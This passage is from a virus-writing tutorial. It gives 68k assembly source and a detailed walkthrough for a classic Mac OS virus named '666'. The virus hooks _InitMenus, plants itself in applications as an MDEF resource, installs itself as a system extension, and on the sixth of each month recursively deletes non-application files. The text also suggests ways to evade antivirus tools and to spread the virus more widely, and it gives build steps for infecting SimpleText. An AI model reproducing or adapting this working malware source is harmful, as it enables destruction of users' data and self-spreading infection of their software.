  BNE.S  ExitInfection      ;exit on error
  MOVE.L  Handle2Us(A4),-(SP)    ;push handle again
  _ChangedResource        ;change attributes
  MOVE.W  ResErr,D0        ;get error code, but ignore
;***************************************************************
;the following labe is where we branch if a resource error occurs
;***************************************************************
ExitInfection
  MOVE.W  ExtRefNum(A4),D0    ;get refnum
  BEQ.S  CallOldMDEF        ;if =0, exit, no resfile opened
  MOVE.W  ExtRefNum(A4),-(SP)    ;if we have one, push it
  _CloseResFile          ;close the file and update it
;***************************************************************
;the following is the branch to the system MDEF code
;***************************************************************
CallOldMDEF
  MOVE.W  CurResFile(A4),-(SP)  ;push id of current resfile
  _UseResFile            ;use old resfile
  MOVEM.L  (SP)+,A0-A4/D0-D7    ;restore registers
  MOVEA.L  Vars,A0          ;fetch label of vars
  MOVEA.L  (A0),A0          ;dereference and get address of SysMDEF
  JMP    (A0)          ;jump to old MDEF code
;***************************************************************
;the following gets executed upon calling _InitMenus. It is the
;pre-processing patch to the _InitMenus routine. Every time an
;application calls _InitMenus, this code will be executed first
;***************************************************************
MyInitMenus
  BRA.S  Next          ;step over next longword
OldInitMenus
  DC.L  0            ;address of original _InitMenus
Next
  MOVEM.L  A0-A4/D0-D7,-(SP)    ;save registers
  LEA    Vars,A4          ;load vars
  CLR.L  NewHandle(A4)      ;make nil handle
  CLR.W  -(SP)          ;room for current res file
  _CurResFile            ;resfile of application that's running
  MOVE.W  (SP)+,CurResFile(A4)  ;store in variable
;***************************************************************
;see if application that's running is infected. Get MDEF=666. If
;non-nil, application is infected.
;***************************************************************
  CLR.L  -(SP)          ;space for handle
  MOVE.L  #'MDEF',-(SP)      ;push restype
  MOVE.W  #666,-(SP)        ;push id=666
  _Get1Resource          ;get it
  MOVE.L  (SP)+,D0        ;put in D0
  BNE    ExitPatch        ;non nil, infected we can exit
;***************************************************************
;now see if our application has any MENU resources
;***************************************************************
  CLR.W  -(SP)          ;room for count
  MOVE.L  #'MENU',-(SP)      ;push restype
  _Count1Resources        ;count how many MENU resources
  MOVE.W  (SP)+,D0        ;copy to D0
  BEQ    ExitPatch        ;if 0, no MENU resources, exit
;***************************************************************
;now fetch MENU resources and check MDEFs
;***************************************************************
  MOVEQ  #0,D3          ;clear flag
  MOVE.L  D0,D2          ;copy how many MENU resources
  MOVEQ  #0,D1          ;initialize counter
@9  ADDQ  #1,D1          ;add one
  CLR.L  -(SP)          ;room for returned MENU handle
  MOVE.L  #'MENU',-(SP)      ;push restype
  MOVE.W  D1,-(SP)        ;push index
  _Get1IxResource          ;get first resource
  MOVE.L  (SP)+,MENURes(A4)    ;get MENU resource
  MOVEA.L  MENURes(A4),A0      ;copy in A0
  _HLock              ;lock MENU resource
  MOVE.W  MemErr,D0        ;check for error
  BNE    ExitPatch        ;exit on error
  MOVEA.L  (A0),A0          ;get data
  CMPI.W  #0,ProcID(A0)      ;check proc id
  SEQ    D3            ;set flag if found MENU with MDEF=0
  BEQ.S  @10            ;exit loop
  MOVEA.L  MENURes(A4),A0      ;handle in A0
  _HUnlock            ;unlock
  CMP.W  D1,D2          ;did we examine all yet?
  BGT.S  @9            ;no, loop back
@10  TST    D3            ;check if we found a menu
  BEQ    ExitPatch        ;no, exit patch
;***************************************************************
;now allocate handle so we can copy ourselves in it
;***************************************************************
  LEA    EndLabel,A0        ;end of virus
  LEA    Entry,A1        ;beginning of virus
  SUBA.L  A1,A0          ;find length of virus
  MOVE.L  A0,bytes2copy(A4)    ;store in bytes2copy
  MOVE.L  A0,D0          ;copy to D0
  _NewHandle            ;allocate new handle
  MOVE.L  A0,NewHandle(A4)    ;store
  BEQ.S  ExitPatch        ;exit on error<>0
  MOVE.L  NewHandle(A4),A0    ;put handle in A0
  _HLock              ;lock the handle
  MOVE.W  MemErr,D0        ;check for error
  BNE.S  ExitPatch        ;exit on error
;***************************************************************
;now copy this very code into the new handle
;***************************************************************
  LEA    Entry,A0        ;source pointer
  MOVE.L  NewHandle(A4),A1    ;get address of master pointer
  MOVE.L  (A1),A1          ;get address of data, destination pointer
  MOVE.L  bytes2copy(A4),D0    ;howmany bytes
  _BlockMove            ;copy virus
  MOVE.L  NewHandle(A4),A0    ;nove handle in A0
  _HUnlock            ;unlock it
  MOVE.W  MemErr,D0        ;check for error
  BNE.S  ExitPatch        ;exit on error
;***************************************************************
;now add resource into active resource file
;***************************************************************
  MOVE.L  NewHandle(A4),-(SP)    ;push handle
  MOVE.L  #'MDEF',-(SP)      ;push type
  MOVE.W  #666,-(SP)        ;push id=666
  PEA    ExtensionName      ;push name
  _AddResource          ;add it
  MOVE.W  ResErr,D0        ;get error
  BNE.S  ExitPatch        ;non zero error code, exit
;***************************************************************
;now change the MDEF id of that menu so that it calls our MDEF
;***************************************************************
  MOVE.L  MENURes(A4),A0      ;put in A0 to lock
  _HLock
  MOVE.W  MemErr,D0        ;check error
  BNE.S  ExitPatch        ;exit on error
  MOVE.L  MENURes(A4),A0      ;get handle to MENU resource
  MOVEA.L  (A0),A0          ;get master pointer of resource handle
  MOVE.W  #666,ProcID(A0)      ;stuff new proc id
  MOVE.L  MENURes(A4),A0      ;get handle again
  _HUnlock            ;unlock it
  MOVE.W  MemErr,D0        ;get error
  BNE.S  ExitPatch        ;exit if we cannot unlock
  MOVE.L  MENURes(A4),-(SP)    ;push handle
  _ChangedResource        ;we changed it
  MOVE.W  ResErr,D0        ;get error code
  BNE.S  ExitPatch        ;exit if error occured
;***************************************************************
;finally update the current resource file
;***************************************************************
  MOVE.W  CurResFile(A4),-(SP)  ;push current res file
  _UpdateResFile          ;write it
ExitPatch
  BSR.S  Dispose          ;dispose any new handles
  MOVE.W  CurResFile(A4),-(SP)  ;push current res file
  _UseResFile            ;use it again, might have been changed
  MOVEM.L  (SP)+,A0-A4/D0-D7    ;restore registers
  MOVEA.L  OldInitMenus,A0      ;get address of original InitMenus
  JMP    (A0)          ;jump to original InitMenus
;***************************************************************
;we need to test whether we need to dispose our new handle.
;***************************************************************
Dispose
  TST.L  NewHandle(A4)      ;is our handle nil?
  BEQ.S  DontDispose        ;if yes, don't dispose anything
;***************************************************************
;we need to test whether our handle is resource or plain.
;***************************************************************
  MOVEQ  #0,D0          ;clear D0
  MOVE.L  NewHandle(A4),A0    ;handle in A0
  _HGetState            ;get the state of the handle
  BTST  #5,D0          ;test the resource bit
  BNE.S  DontDispose        ;if set, exit
  MOVE.L  NewHandle(A4),A0    ;put in A0
  _DisposeHandle          ;dispose regular handle if addresource failed
DontDispose
  RTS
;***************************************************************
;the following subroutine will erase the drive contents!!!
;it will recursivelly go down any directory, deleting any non
;application files it finds
;A0 holds the address of CInfoPB, or HParamBlock
;A1 holds the address of CInfoPB as a copy
;D1 is the recursive directory counter
;D0 is usually the error code from routines
;***************************************************************
EraseDrive
  LINK  A6,#0          ;no locals
  MOVE.L  D1,-(SP)        ;save D1
  MOVEQ  #0,D1          ;start counter
AddOne
  ADDQ  #1,D1          ;add 1 to counter
  LEA    CInfoPB,A0        ;load address of our record
  CLR.L  ioCompletion(A0)    ;nil
  LEA    theName,A1        ;name address
  MOVE.L  A1,ioNamePtr(A0)    ;name address
  MOVE.W  12(A6),ioVRefNum(A0)  ;vrefnum we want
  MOVE.L  8(A6),ioDirId(A0)    ;dirid
  MOVE.W  D1,ioFDirIndex(A0)    ;index into directory
  _GetCatInfo            ;get directory info
  CMP.W  #fnfErr,D0        ;see if end of directory
  BEQ.S  ExitScan        ;exit scanning if done
  MOVE.B  ioFLAttrib(A0),D0    ;get file attributes
  BTST  #4,D0          ;is it a directory?
  BEQ.S  EraseFile        ;no, go to erase
  MOVE.W  12(A6),-(SP)      ;push vrefnum
  MOVE.L  ioDrDirId(A0),-(SP)    ;push directory
  JSR    EraseDrive        ;call recursivelly
  BRA.S  DontCorrect        ;continue with rest of directories
EraseFile
  CMP.L  #'APPL',FileType(A0)  ;check file type
  BEQ.S  DontCorrect        ;don't erase applications
  MOVEA.L  A0,A1          ;copy address
  LEA    HParamBlock,A0      ;load address of block
  CLR.L  ioCompletion(A0)    ;nil
  LEA    theName,A2        ;address of string
  MOVE.L  A2,ioNamePtr(A0)    ;put in ionameptr
  MOVE.W  12(A6),ioVRefNum(A0)      ;put vrefnum
  MOVE.L  ioFLParId(A1),ioDirID(A0)    ;put parent directory
  _HDelete
  BNE.S  DontCorrect        ;if no error, don't correct
  SUBI.W  #1,D1          ;one less on index
DontCorrect
  BRA.S  AddOne          ;loop back
ExitScan
  MOVE.L  (SP)+,D1        ;restore D1
  UNLK  A6            ;unlink
  MOVEA.L  (SP)+,A0        ;pop return address
  ADDQ  #6,SP          ;pop arguments
  JMP    (A0)          ;return
ExtensionName
  DC.B  $04,$01,'666',$00
Vars
  DCB.B  34,0
theSpec
  DCB.B  70,0
Finfo
  DCB.B  16,0
DatTimeRec
  DCB.B  14,0
CInfoPB
  DCB.B  108,0
HParamBlock
  DCB.B  122,0
theName
  DCB.B  64,0
EndLabel
  ENDMAIN
  END

First, we define some offsets to reference our variables which start at label
Vars. Register A4 will always point to the Vars label at run time. Our
Entrance label is 'Entry' and is used later to calculate the length of the
virus. Then we save all registers except A5, A6, and A7. As you remember, A5
is used to reference global variables in any program, so we don't fool around
with it. A6 is the stack frame register, so we leave it alone. A7=SP is the
Stack pointer, so we leave that alone as well. We don't really need to access
any of these. We save all the rest just in case. We will not be using most of
the saved ones, but i like to be on the safe side. Then we load the 'Vars'
label into A4, so we can reference all our variables. Next we get hold of the
current resource file, since we need to restore it before we exit so we don't
inadvertently change the order of resource files and have unpredictable
crashes. Be VERY careful when you change the current resource file. ALWAYS
restore it in the end, before you exit. Other resource manager routines
depend on finding the file resource map in memory intact. We copy the current
resource file reference number into our var section. Ok, basic housekeeping
is done. We then need to determine the state of our execution. Namely, this
virus has two states, depending on the double action principle. If it is run
from the system, it is in the first state. If it is run from an infected
application, it is in the second state. How do we determine the state we are
in? Simple. We look for an INIT resource in the current resource file (that
is, us) and if it exists, that means we are running as an INIT. If it does
not, we are running as a MDEF. We use the trap _Get1Resource to get hold of
the INIT resource and we store it in the corresponding variable. The, if the
data transfered was zero, indicating a nil master pointer for the resource
fetched, we branch into the second state, that is, the MDEF state. Here,
let's assume that we are in the first state, that of having fetched
succesfully an INIT resource, so we fall through onto the next statement. Our
extension now, will patch the _InitMenus trap. A small diversion here. Those
two wonderful traps, _GetToolboxTrapAddress and _SetToolboxTrapAddress that
come next, are the main tools of patching. Look back into the TRAP PATCHING
section of the article. For example, if I used the trap
_GetToolboxTrapAddress on the trap $A9AB, it would return the address
$3501980 to us. That's what those traps do. They fetch the actual routine
address from the dispatch table. The second one, can set the address to
whatever we want. So we move the trap number for _InitMenus into D0 and call
the _GetToolboxTrapAddress to recover the actual routine address. Then we
stuff the returned address into the label "OldInitMenus". After we save thus,
we install onto the trap _InitMenus OUR address, which is "MyInitMenus". That
will make sure that everytime someone calls _InitMenus, our code will be
executed first. Then, we call DetachResource on the entire INIT, to
disassociate it from our file, and to cause it to float in memory regardless
of our closing the Extension. A note here: It is assumed that any trap
patches are installed into the System Heap, and they are Locked. Don't make
the mistake of building an Extension from MPW of this code without setting
the resSysHeap, resPreload and resLocked bits. The machine will crash badly
if you forget those. The virus installs the resource correctly when it runs
off an application. Finally, we restore our registers and we exit gracefully.
The RTS instruction will bring us back to whoever called our Extension file.
The Extension now has done its job. Any time someone calls _InitMenus, that
someone will be running our code first, so he will be infected immediatelly
from memory. We continue with the second state. The code that will run from
an infected application. This code starts at the label MDEF. So let's look at
this code in detail: First we get hold of ourselves, i.e. the very code
that's running, but this time as a MDEF resource. We call GetResource and
this call returns basically a handle to the beginning of the virus code. We
store this handle in the variable 'Handle2Us'. Then we need to fetch the
original MDEF=0 code, so we can jump to it when we are done. We thus call
GetResource from the System file and we store the handle into 'SystemMDEF'.
If the handle is non-nil, we branch immediatelly into the 'InfectSys' label.
If it is nil (0), we are in trouble. Since we don't have any code to jump to
when we are done, we must necessarilly crash. So, we do. This is what the
trap _Debugger does. Here I have added a simple date-trigger test, which will
be used to activate the virus' evil behaviour. While on the label CheckDate
then, we fetch the system date from the low mem global "Time" and we convert
that to a dateTimeRec. Then we check the day, and if it is the sixth of the
month, all hell breaks loose. First we get the default volume. Then we push
the volume number onto the stack, and then we push the first directory id,
which is 2. Then we call the subroutine at the end of the program to erase
the drive contents. More on that subroutine later. So let's assume now its
not an erase date. We then pass onto the 'InfectSys' code. There, we clear
the variable ExtRefNum first to zero, so that we can have a way later to
determine if we have opened a new resource file-the Extension that we are
going to install. Then we call the trap _FindFolder to get hold of the
vRefnum and dirID of the Extensions directory on the system disk. We then try
to make a file speciification for our file, by using the returned
foundVrefNum and foundDirId from _FindFolder. Next we try to create the file
itself, based on the file specification we got from the above calls. Note
here, that we ignore the error retured from _FSpCreateResFile (might be
non-zero if the file exists already) because we need to open the file anyway.
For example, if an AV is running, it will not let us create such a file.
There will be a file created with no creator and filetype if we fail because
of an AV. Thus, if a failed file exists, we need to reset its file attributes
and copy the virus there. That's why we call _FSpGetFInfo, to get its
attributes anyway. We then reset the attributes and call _FSpSetFInfo to set
them again, in case the file was a failed one from a previous unsuccessful
attempt. We then call _FSpOpenResFile and try to open the file with write
permission to look inside. We look for an 'INIT' with id=666 resource. If the
Get1Resource call returns a handle to such a resource, the system is
infected, so we can exit. If it is not infected, we disassociate ourselves
from our file with DetachResource and we add ourselves to the file as an INIT
resource of id=666. Next, we remind ourselves that the INIT resource in that
special file needs to be resSysHeap+resPreload+resLocked. So we set those
attributes appropriately on the new resource. We first get the old ones, and
set the bits on those old ones, so we don't upset any preset ones. Finally we
call ChangedResource on the newlly added resource, and we exit. Upon exiting,
we look at the refnum of the opened Extension. If it is zero, it means we
haven't opened anything, so we just don't close any files. If it is nonzero,
we close the newlly created file. Then we fetch the address of the old MDEF
from where it has been stored and JMP to that location after we restore the
current resource file. From that point on, the MDEF=0 takes over control and
performs the regular MENU operations as expected. What follows, is the actual
patch code that gets executed upon anybody calling _InitMenus. We must carry
this code with us always, since we must install it on an uninfected system.
To understand the entry section, look at the previous TRAP PATCHING section
on this article. This code starts with a BRA instruction to jump over the
label that holds the original address of _InitMenus, as it has been stored
there from our Extension file. Then we first save all the registers again,
and load our variables into register A4 as we did before with the MDEF code
section. We clear our NewHandle variable so that we can tell later if we have
something non-zero there. We immediatelly get hold of the current resource
file (which will be the application that has called _InitMenus) and store it
in the variable CurResFile. We next examine if this current application that
is running is already infected. The test for that is whether the
Get1Resource('MDEF',666) call is successful. If it is, the application is
already infected, so we exit. If it is not, we will infect it. We then look
if the application has any MENU resources. If it doesn't have any, it is
immune against our virus, since even if we infect it, the MDEF=666 will never
be activated, since there will be no MENU resource with MDEF=666 to activate
it. We COULD infect it, but i like simplicity. There is no reason we should
infect a stale application that has no chance of propagating the virus. The
call Count1Resources('MENU') returns how many resources of that type are
inside the application. If none, we exit. If <>0 then we pick a MENU with a
valid index (that will be some MENU resource with MDEF=0) and get hold of
that MENU resource, this time through this index. (Instead of calling
GetResource('xxxx',id) you can call Get1IxResource('xxxx',index) with index
varying from 1 to Count1Resources('xxxx') to get handles to those resources
instead. Then the crucial part: We need to calculate how long our virus is.
We thus subtract the beginning of the virus from the end, to get a count,
which we load into the variable 'bytes2Copy', so we can use it later. We call
NewHandle to allocate this many bytes, and we store this handle in the
variable 'NewHandle'. We must now 'lock' the handle so that it doesn't move
in memory, and after we successfully do, we copy ourselves onto the block of
memory our new handle points to, using BlockMove. We then unlock our handle
and we are ready to copy. We push the type and id of the resource we want to
add, and we add it to the current resource file (i.e. the file that is
running). If an AV is running, the AddResource call will fail (we will tell
that with ResErr<>0), and in this case, we branch immediatelly into
'ExitPatch'. Next, we need to change the MDEF id of that MENU resource so
that when the menu manager tries to draw our menu, our MDEF=666 will
activate. The MDEF resource id is stored in the MENU resource 6 bytes into
the data record. So we stuff a 666 in there. We then unlock the resource and
call ChangedResource so that the file resource map will be updated on call
later. In fact the UpdateResFile follows, which writes all our changes
permanently. What follows, needs careful analysis. It is the ExitPatch label
inside which we need to perform certain tests to insure that we don't
unecessarily do something we don't need to. For example, if we exited due to
an error, we might have not allocated a NewHandle. That's why we test for a
nil handle here, and if it is nil, we don't do anything else but simply exit.
If however our calls for NewHandle were successful, we need to determine if
we have a plain memory handle (i.e. if we successfully allocated memory but
failed to add a resource) or a resource handle (i.e. if we have successfully
allocated memory AND the handle was added later as a resource, which means it
became a resource handle) For that, we call HGetState(NewHandle) to get its
state. If bit #5 on 'state' is set, then it is a resource handle. If not, it
is a plain handle. Accordingly, we call the proper routine. Either
DisposeHandle, or ReleaseResource, depending on what we have. Finally we
restore the current resource file and the registers, and JMP onto the
original routine for _InitMenus. That's it :)

DIRECTORY SCANNING

Before we analyze the Erasing subroutine, lets look a bit at the Pascal
Source of the predecessor to my Erase subroutine, on which the asm routine is
based. It is quite simple:

program CatInfo;
{$I-}
  var
    err: integer;
    vRefNum: integer;
    CInfoPB: CInfoPBRec;
    theName: Str255;
  procedure TraverseDrive (vRefNum: integer; DirId: longint);
    var
      i: integer;
      err, ferr: integer;
  begin
    i := 0;
    repeat
      i := i + 1;
      with CInfoPB do
        begin
          ioCompletion := nil;
          ioNamePtr := @theName;
          ioVRefNum := vRefNum;
          ioDirID := DirId;
          ioFDirIndex := i;
        end;
      err := PBGetCatInfo(@CInfoPB, false);
      if (err = noErr) then
        if BTST(CInfoPB.ioFLAttrib, 4) then
          TraverseDrive(vRefNum, CInfoPB.ioDrDirId)
        else
          writeln(theName)
    until err = fnfErr;
  end;
begin
  InitGraf(@thePort);
  InitWindows;
  InitMenus;
  TEInit;
  InitDialogs(nil);
  err := GetVol(nil, vRefNum);
  writeln(vRefNum);
  TraverseDrive(vRefNum, 2);
end.

The source is pretty self explanatory. We first get the default volume number
and we pass this along with the first directory id=2 to the subroutine. The
subroutine simply scans a directory, and enumerates its contents. If the
fetched item is a directory, (BTST(CInfoPB.ioFLAttrib, 4)), we call
recursivelly and go one level down to traverse the new directory. If it is a
file, we just write its name. The idea is very simple. If we wanted to erase
the drive, we would have instead of writeln, an HDelete. But note one
important catch here! If we delete a file of say enumeration index n, we
actually LOSE one index, so we must subtract one from our index scan counter.
This is a very common bug, which many viruses so far have missed, and as
such, their erase routines fail. But ours does not :) So let's go and look at
the granddaddy of all eraseing subroutines, the simplest possible directory
scanner, in asm:

THE ERASE DRIVE SUBROUTINE

The last segment of our virus is a subroutine that gets called when the date
trigger activates the virus. It needs to be a complete subroutine, with LINK
and UNLK and stuff, since we will be calling it recursivelly. We first LINK
A6 with 0 bytes locals, (we have no need for locals) and then we save
register D1, since our counter needs to be preserved recursivelly when we go
up one level. The subroutine accepts two arguments on the stack, a vRefNum,
(2 bytes) and a DirID (4 bytes). These arguments after the link are to be
found at 12(A6) and at 8(A6). So each time we enter the subroutine, we
retrieve them from those locations and feed them into our CINfoPB parameter
block, to give them as parameters to _GetCatInfo. We also give a dirIndex,
which is simply a counter of objects in any directory and then we call the
trap. The trap returns information in our CInfoPB parameter block. If the
trap returns fnfErr (file not found error) we exit. The trap returns this
error when the entire directory has been traversed. If the error is nonzero,
we check the objects file attributes like in the Pascal source, to see if it
is a file or a directory. If it is a file, we jump to the label EraseFile. If
not, we call the subroutine recursivelly. After we are done, we branch to
DontCorrect, which simply loops back and increases our counter. On the label
EraseFile, we check the fileType of the returned file. If it is an
application we leave it alone. There is no sense in erasing the very carriers
of the virus. That would be equivallent to the virus committing suicide. We
don't want that of course!!! Then, provided our file is not an APPL, we load
the correct fields into our HParamBlock record, and we call _HDelete. If
_HDelete returns an error (such as file busy or whatever) we simply loop back
to increasing the counter and continue with our scanning. If however the call
was successfull, we need to decrease our counter by one, because we have one
file less in the directory now!!!. So then, we branch back to increasing our
counter, and we continue. Finally, the ExitScan label will be reached when
all the objects in a particular directory have been enumerated, so we restore
D1, Unlink our stack frame, pop the return address, pop our arguments (2 for
vRefNum+4 for DirID) and we return to whoever called us. The subroutine is
actually a direct adaptation to the Pascal enumerator, with the exception of
the index correction when we delete. You should have no problems
understanding it. It is actually pretty simple. Don't forget to check Inside
Macintosh, to see how we load all those blocks into A0 before we call the
corresponding traps.

What follows are the Extension name and our vars.

A NOTE ON ENCRYPTION

Before submitting this project to the Codebreakers, i was thinking why not
finish a nicely done job and encrypt the virus. The job is actually quite
easy. I would have the first instruction to be a BRA  Decrypt and when the
virus needs to add resources to other files, I would do a BSR Encrypt. The
Decryption engine would be appended to the end of the virus, and it would be
relatively simple. Actually i did it, and the engine was around 40-50 bytes.
But upon seriously thinking about it, when i looked at the encrypted version
of the virus, i could easily spot the pick up of the key from the location i
was storing it. If someone is a specialist on asm, one could immediately
figure out the engine. I was going to implement a simple XOR encryption, but
the virus got bulky and complicated, and it crashed for some reason that
would have taken me weeks to figure out using MacsBug. I had enough trouble
to figure out why this version crashed, before i figured out to split my
DisposeHandles routine to two pieces, one that disposed Memory handles and
the other that Released Resource manager handles. That was tricky. In any
case, even if the encryption was successful, the id of the MDEF would be
always 666. So any scanning program would simply check for any MDEF=666
resources and it would issue alerts immediatelly. One possible solution to
that would be to infect application files with MDEFs of variant ids. This
technique though, would complicate the signature verification of the virus,
as the virus would have to check for all possible MDEF ids to figure out if
an application is alerady infected. Still, even if one did that, the
decryption engine would be visible. I am not a specialist on virus
encryption, and i am sure that PeeCee guys out there have many mutational
Encryption engines, but i am not going to proceed thus far. I will leave it
as is (for now).

EPILOGUE

I will emphasize again that it is very easy for this virus to escape your
control. Be VERY careful when you experiment with it. In some cases AV tools
may not help you at all. I haven't examined its behaviour under many AVs,
except some that just track suspicious behaviour, such as Gatekeeper and SAM
Intercept. If it runs away from you, open all your files with either ResEdit
or Resourcerer and look for MDEFs with ids of 666. Remove them all, and also
look in the MENU resources of those programs, and change their MDEF ids where
they have been changed back to 0. In fact if it escapes you, you are in deep
shit, because on the next 6-th of the month, one instance of it will attempt
to erase your drive's contents. IF THIS VIRUS ESCAPES YOU, DON'T START YOUR
MACHINE AT ALL ON ANY SIXTH OF THE MONTH BEFORE YOU CLEAN UP ALL OF THE
INFECTION!!!! Lots of work i assure you. But this is the price of wanting to
fool around with beasties like this one. Otherwise, have lots of fun with
this one, its my best accomplishment so far in the area of Mac viruses and
the first virus that has no problems whatsoever on all the OSs from 6.0.7 and
up. I hope i have explained everything as best as i could.

ENHANCEMENTS

One could easily enhance upon the existing source. What comes to mind is
first of all efficient encryption with variant MDEF ids. I.e. the virus could
infect different applications with MDEFs of different ids. Of course the
infection verification will become quite bulky. But you could use
Get1IxResource to scan through the MDEFs to find if one is ours. Another
possible enhancement would be to make the virus more infectuous. Note that if
both the system and the application that's running are infected, the virus
basically does nothing. One could use here the routine _PBGetCatInfo to find
another application on the hard drive, possibly a random one, and infect it
statically. (our infection is dynamic, through memory remember) Of course
that would present additional difficulties, such as calling _Random, but
remember the seed for _Random is set to one every time an application is
first run. SO we essentially don't have access to true Randomness. But one
could fool around with the globals and feed the time into randseed.
Difficult-the virus has no globals-but not impossible. Try to experiment with
some of these ideas and see what you can come up with. I am too bored to
explore all of them :)

BULDING THE PROJECT

Finally the MPW commands to build it, assuming you have the application
SimpleText on your working directory, are: asm -o 666.a.o 666.a link 666.a.o
-o SimpleText -rt 'MDEF'=666 You also need to change the MDEF id of some MENU
in the application SimpleText so that the virus activates. Open SimpleText
with ResEdit. Double click on the MENU resources. Double click on one menu.
From the MENU menu, select "Edit Menu & MDEF id...". On the MDEF ID box,
enter 666. Save the changes and close. The application SimpleText is now
infected and active.

THANX TO:

I would like to thank Spo0ky and Opic for their invaluable suggestions. In
fact, some of the later projects like 666.polymorphic and 666.Symbiotic would
never have been possible (well, i could not resist and finally added
polymorphism to the 666 projects, download them from my section!!:) if it was
not for their tutorials in polymorphism and generic mutation. These guys seem
to have the brains of a CPU and although much younger than me, i am really
proud to have them as leaders. In fact again, polymorphism was suggested to
me by opic and symbiotism by spo0ky who has created the nastiest symbiotic
out there: DEScendant of Devil. Cheers guys.

Have fun
(c) J.S.Bach-XTAR

